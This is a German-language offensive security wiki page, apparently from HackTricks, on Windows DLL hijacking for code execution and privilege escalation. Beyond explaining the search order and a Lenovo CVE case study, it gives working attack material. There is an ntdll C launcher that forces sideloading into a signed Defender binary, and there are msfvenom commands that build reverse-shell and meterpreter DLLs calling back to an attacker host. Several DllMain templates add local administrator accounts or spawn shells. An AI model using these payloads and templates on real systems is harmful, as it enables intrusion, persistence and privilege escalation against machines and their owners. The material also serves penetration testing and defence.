# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Grundlegende Informationen

DLL Hijacking beinhaltet das Manipulieren einer vertrauenswürdigen Anwendung, sodass sie eine bösartige DLL lädt. Dieser Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection, and Side-Loading**. Es wird hauptsächlich für Code-Ausführung, Persistenz und seltener für Privilegieneskalation eingesetzt. Obwohl hier der Fokus auf Eskalation liegt, bleibt die Methode des Hijackings je nach Ziel gleich.

### Häufige Techniken

Es werden mehrere Methoden für DLL Hijacking verwendet, deren Wirksamkeit vom DLL-Ladeverhalten der Anwendung abhängt:

1. **DLL Replacement**: Ersetzen einer echten DLL durch eine bösartige, optional unter Verwendung von DLL Proxying, um die Funktionalität der Original-DLL zu erhalten.
2. **DLL Search Order Hijacking**: Platzieren der bösartigen DLL in einem Suchpfad vor der legitimen DLL, indem das Suchmuster der Anwendung ausgenutzt wird.
3. **Phantom DLL Hijacking**: Erstellen einer bösartigen DLL, die die Anwendung zu laden versucht, weil sie glaubt, dass eine benötigte DLL fehlt.
4. **DLL Redirection**: Ändern von Suchparametern wie %PATH% oder .exe.manifest / .exe.local Dateien, um die Anwendung zur bösartigen DLL zu leiten.
5. **WinSxS DLL Replacement**: Ersetzen der legitimen DLL durch eine bösartige Version im WinSxS-Verzeichnis, eine Methode, die oft mit DLL side-loading assoziiert ist.
6. **Relative Path DLL Hijacking**: Platzieren der bösartigen DLL in einem vom Benutzer kontrollierten Verzeichnis zusammen mit der kopierten Anwendung, ähnlich zu Binary Proxy Execution-Techniken.

## Finden fehlender DLLs

Die gebräuchlichste Methode, fehlende DLLs in einem System zu finden, ist das Ausführen von [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) aus den sysinternals und das **Setzen** der **folgenden 2 Filter**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

und danach nur die **File System Activity** anzeigen:

![](<../../../images/image (153).png>)

Wenn du allgemein nach **fehlenden DLLs** suchst, lässt du das für einige **Sekunden** laufen.\
Wenn du nach einer **fehlenden DLL in einem bestimmten Executable** suchst, solltest du **einen weiteren Filter wie "Process Name" "contains" "\<exec name>" setzen, das Programm ausführen und die Erfassung stoppen**.

## Exploiting Missing Dlls

Um Privilegien zu eskalieren, ist unsere beste Chance, eine DLL zu schreiben, die ein privilegierter Prozess zu laden versucht, an einem Ort, an dem sie gesucht wird. Daher können wir eine DLL in einen **Ordner** schreiben, in dem die **DLL vor** dem Ordner gesucht wird, in dem die **Original-DLL** liegt (ungewöhnlicher Fall), oder wir können in einen Ordner schreiben, in dem die DLL gesucht wird, während die Original-**DLL nirgendwo existiert**.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows-Anwendungen suchen nach DLLs, indem sie einer Reihe vordefinierter Suchpfade in einer bestimmten Reihenfolge folgen. Das Problem von DLL Hijacking entsteht, wenn eine schädliche DLL strategisch in einem dieser Verzeichnisse platziert wird, sodass sie vor der authentischen DLL geladen wird. Eine Lösung, dies zu verhindern, ist sicherzustellen, dass die Anwendung absolute Pfade verwendet, wenn sie die benötigten DLLs angibt.

Du kannst die **DLL search order on 32-bit** Systemen unten sehen:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Das ist die **Standard**-Suchreihenfolge mit aktiviertem **SafeDllSearchMode**. Wenn dieser deaktiviert ist, rückt das aktuelle Verzeichnis an die zweite Stelle. Um diese Funktion zu deaktivieren, erstelle den Registry-Wert **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** und setze ihn auf 0 (standardmäßig aktiviert).

Wenn die Funktion [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) mit **LOAD_WITH_ALTERED_SEARCH_PATH** aufgerufen wird, beginnt die Suche im Verzeichnis des ausführenden Moduls, das **LoadLibraryEx** lädt.

Beachte schließlich, dass **eine DLL auch über einen absoluten Pfad angegeben werden kann statt nur über den Namen**. In diesem Fall wird die DLL **nur in diesem Pfad** gesucht (wenn die DLL Abhängigkeiten hat, werden diese wie üblich nach dem Laden anhand ihres Namens gesucht).

Es gibt weitere Möglichkeiten, die Suchreihenfolge zu beeinflussen, die hier nicht erklärt werden.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Eine fortgeschrittene Möglichkeit, den DLL-Suchpfad eines neu erstellten Prozesses deterministisch zu beeinflussen, besteht darin, das DllPath-Feld in RTL_USER_PROCESS_PARAMETERS zu setzen, wenn der Prozess mit den nativen ntdll-APIs erstellt wird. Durch Angeben eines vom Angreifer kontrollierten Verzeichnisses hier kann ein Zielprozess, der eine importierte DLL per Namen auflöst (kein absoluter Pfad und ohne sichere Ladeflags), gezwungen werden, eine bösartige DLL aus diesem Verzeichnis zu laden.

Kernidee
- Baue die Prozessparameter mit RtlCreateProcessParametersEx und gib ein benutzerdefiniertes DllPath an, das auf deinen kontrollierten Ordner zeigt (z. B. das Verzeichnis, in dem dein dropper/unpacker liegt).
- Erstelle den Prozess mit RtlCreateUserProcess. Wenn das Ziel-Binary eine DLL per Namen auflöst, konsultiert der Loader das bereitgestellte DllPath während der Auflösung, wodurch zuverlässiges sideloading möglich wird, selbst wenn die bösartige DLL nicht neben dem Ziel-EXE liegt.

Hinweise/Einschränkungen
- Dies beeinflusst den erstellten Kindprozess; es unterscheidet sich von SetDllDirectory, das nur den aktuellen Prozess betrifft.
- Das Ziel muss eine DLL per Namen importieren oder mit LoadLibrary laden (kein absoluter Pfad und ohne Verwendung von LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs und hartkodierte absolute Pfade können nicht gehijackt werden. Forwarded exports und SxS können die Präzedenz verändern.

Minimal C example (ntdll, wide strings, simplified error handling):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Praktisches Einsatzbeispiel
- Platzieren Sie eine bösartige xmllite.dll (die die erforderlichen Funktionen exportiert oder als Proxy für die echte DLL fungiert) in Ihrem DllPath-Verzeichnis.
- Starten Sie ein signiertes Binary, von dem bekannt ist, dass es xmllite.dll per Namen nachschlägt, unter Verwendung der obigen Technik. Der Loader löst das Import über das angegebene DllPath auf und sideloads your DLL.

Diese Technik wurde in-the-wild beobachtet und treibt multi-stage sideloading chains an: ein initialer Launcher droppt eine Helper-DLL, welche dann ein Microsoft-signed, hijackable Binary mit einem custom DllPath startet, um das Laden der attacker’s DLL aus einem Staging-Verzeichnis zu erzwingen.


#### Ausnahmen der DLL-Suchreihenfolge laut Windows-Dokumentation

Bestimmte Ausnahmen von der standardmäßigen DLL-Suchreihenfolge werden in der Windows-Dokumentation erwähnt:

- Wenn eine **DLL, die denselben Namen wie eine bereits im Speicher geladene Datei teilt**, gefunden wird, umgeht das System die übliche Suche. Stattdessen führt es eine Prüfung auf Umleitung und ein Manifest durch, bevor es auf die bereits im Speicher befindliche DLL zurückfällt. **In diesem Szenario führt das System keine Suche nach der DLL durch**.
- Falls die DLL als eine **known DLL** für die aktuelle Windows-Version erkannt wird, verwendet das System seine Version der known DLL sowie alle abhängigen DLLs und **zeigt auf den Suchprozess**. Der Registry-Schlüssel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** enthält eine Liste dieser known DLLs.
- Sollte eine **DLL Abhängigkeiten haben**, wird die Suche nach diesen abhängigen DLLs so durchgeführt, als wären sie nur durch ihre **Modulnamen** angegeben, unabhängig davon, ob die ursprüngliche DLL durch einen vollständigen Pfad identifiziert wurde.

### Privilegien-Eskalation

**Voraussetzungen**:

- Identifizieren Sie einen Prozess, der unter **verschiedenen Privilegien** (horizontal or lateral movement) läuft oder laufen wird, dem **eine DLL fehlt**.
- Stellen Sie sicher, dass für ein beliebiges **Verzeichnis**, in dem nach der **DLL** gesucht wird, **Schreibzugriff** vorhanden ist. Dieser Ort kann das Verzeichnis der ausführbaren Datei oder ein Verzeichnis im Systempfad sein.

Ja, die Voraussetzungen sind schwer zu finden, da **es standardmäßig irgendwie ungewöhnlich ist, eine privilegierte ausführbare Datei ohne eine DLL zu finden** und es noch **ungewöhnlicher ist, Schreibrechte in einem Systempfad-Ordner zu haben** (standardmäßig nicht möglich). Aber in fehlkonfigurierten Umgebungen ist dies möglich.\
Falls Sie Glück haben und die Voraussetzungen erfüllen, können Sie sich das Projekt [UACME](https://github.com/hfiref0x/UACME) anschauen. Auch wenn das **Hauptziel des Projekts ist bypass UAC**, finden Sie dort möglicherweise einen **PoC** von einer Dll hijaking für die Windows-Version, den Sie verwenden können (vermutlich genügt es, den Pfad des Ordners anzupassen, in dem Sie Schreibrechte haben).

Beachten Sie, dass Sie Ihre **Berechtigungen in einem Ordner** folgendermaßen prüfen können:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Und **prüfe die Berechtigungen aller Ordner im PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Du kannst auch die Imports eines Executables und die Exports einer dll mit folgendem Befehl prüfen:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Für eine vollständige Anleitung, wie man **Dll Hijacking missbraucht, um Privilegien zu eskalieren** wenn man Schreibrechte in einem **Ordner im System-PATH** hat, siehe:


{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Automatisierte Tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) wird prüfen, ob Sie Schreibrechte in einem Ordner innerhalb des System-PATH haben.\
Weitere interessante automatisierte Tools, um diese Schwachstelle zu entdecken, sind **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll._

### Beispiel

Falls Sie ein ausnutzbares Szenario finden, ist eine der wichtigsten Voraussetzungen für einen erfolgreichen Exploit, eine dll zu erstellen, die mindestens alle Funktionen exportiert, die das ausführbare Programm daraus importieren wird. Beachten Sie außerdem, dass Dll Hijacking nützlich sein kann, um von Medium Integrity Level auf High zu eskalieren **(UAC umgehen)** ([../../authentication-credentials-uac-and-efs/index.html#uac](../../authentication-credentials-uac-and-efs/index.html#uac)) oder von [**High Integrity zu SYSTEM**](../index.html#from-high-integrity-to-system). Sie finden ein Beispiel dafür, **wie man eine gültige dll erstellt**, in dieser dll hijacking-Studie, die sich auf dll hijacking für die Ausführung konzentriert: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Außerdem finden Sie im **nächsten Abschnitt** einige **grundlegende dll-Codes**, die als **Vorlagen** nützlich sein könnten oder um eine **dll mit zusätzlich exportierten, nicht benötigten Funktionen** zu erstellen.

## **Erstellen und Kompilieren von Dlls**

### **Dll Proxifying**

Grundsätzlich ist ein **Dll proxy** eine Dll, die beim Laden Ihren bösartigen Code ausführen kann, aber auch die erwartete Funktionalität bereitstellt, indem sie alle Aufrufe an die echte Bibliothek weiterleitet.

Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) können Sie tatsächlich ein ausführbares Programm angeben und die Bibliothek auswählen, die Sie proxifizieren möchten, und eine proxifizierte dll generieren, oder die Dll angeben und eine proxifizierte dll generieren.

### **Meterpreter**

**Hole rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Hole einen meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Erstelle einen Benutzer (x86 — ich habe keine x64-Version gesehen):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Dein eigenes

Beachte, dass in mehreren Fällen die Dll, die du kompilierst, **export several functions** muss, die vom victim process geladen werden. Wenn diese functions nicht existieren, wird die **binary won't be able to load** sie, und der **exploit will fail**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Fallstudie: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Dieser Fall demonstriert **Phantom DLL Hijacking** bei Lenovos TrackPoint Quick Menu (`TPQMAssistant.exe`), erfasst als **CVE-2025-1729**.

### Details zur Verwundbarkeit

- **Komponente**: `TPQMAssistant.exe` befindet sich unter `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Geplante Aufgabe**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` läuft täglich um 9:30 AM im Kontext des angemeldeten Benutzers.
- **Verzeichnisberechtigungen**: Schreibbar für `CREATOR OWNER`, wodurch lokale Benutzer beliebige Dateien ablegen können.
- **DLL-Suchverhalten**: Versucht zuerst, `hostfxr.dll` aus seinem Arbeitsverzeichnis zu laden und protokolliert "NAME NOT FOUND", falls sie fehlt — was auf Vorrang der lokalen Verzeichnissuche hinweist.

### Exploit-Implementierung

Ein Angreifer kann eine bösartige `hostfxr.dll`-Stubdatei im selben Verzeichnis ablegen und die fehlende DLL ausnutzen, um Codeausführung im Kontext des Benutzers zu erreichen:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Angriffsablauf

1. Als Standardbenutzer `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\` ablegen.
2. Auf die Ausführung der geplanten Aufgabe um 9:30 Uhr im Kontext des aktuellen Benutzers warten.
3. Wenn ein Administrator angemeldet ist, wenn die Aufgabe ausgeführt wird, läuft die bösartige DLL in der Sitzung des Administrators mit mittlerer Integrität.
4. Verwende Standard UAC bypass techniques, um von mittlerer Integrität auf SYSTEM-Privilegien zu eskalieren.

### Gegenmaßnahme

Lenovo hat über den Microsoft Store die UWP-Version **1.12.54.0** veröffentlicht, die TPQMAssistant unter `C:\Program Files (x86)\Lenovo\TPQM\TPQMAssistant\` installiert, die verwundbare geplante Aufgabe entfernt und die veralteten Win32-Komponenten deinstalliert.

## Quellen

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)


- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)


- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../../banners/hacktricks-training.md}}
